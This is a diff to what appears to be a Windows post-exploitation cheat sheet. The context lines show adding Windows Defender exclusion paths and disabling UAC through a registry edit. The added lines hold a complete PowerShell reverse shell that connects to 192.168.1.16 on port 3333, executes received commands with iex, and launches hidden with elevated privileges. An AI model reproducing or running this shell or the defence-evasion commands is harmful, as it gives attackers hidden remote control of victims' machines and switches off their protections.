@@ -40,6 +40,9 @@ powershell Set-MpPreference -ExclusionPath <path>
 to verify it was excluded :
 powershell -c "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath"
 ---------------------------------------------------------------------------------------------------------------
+Admin Shell via User Interaction 
+Start-Process "cmd.exe" -ArgumentList "/c powershell -windowstyle hidden -c `"`$C=new-object net.sockets.tcpclient('192.168.1.16',3333);`$S=`$C.GetStream();[byte[]]`$B=0..65535|%{0};while((`$I=`$S.Read(`$B,0,`$B.Length)) -ne 0){;`$D=(new-object -typename System.Text.ASCIIEncoding).GetString(`$B,0,`$I);`$O=(iex `$D 2>&1 | Out-String);`$OB=`$O+'PS '+(pwd).Path+'> ';`$SB=([text.encoding]::ASCII).GetBytes(`$OB);`$S.Write(`$SB,0,`$SB.Length);`$S.Flush()};`$C.Close()`"" -Verb RunAs -WindowStyle Hidden
+---------------------------------------------------------------------------------------------------------------
 With Administrator Privs 
 To disable UAC :
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
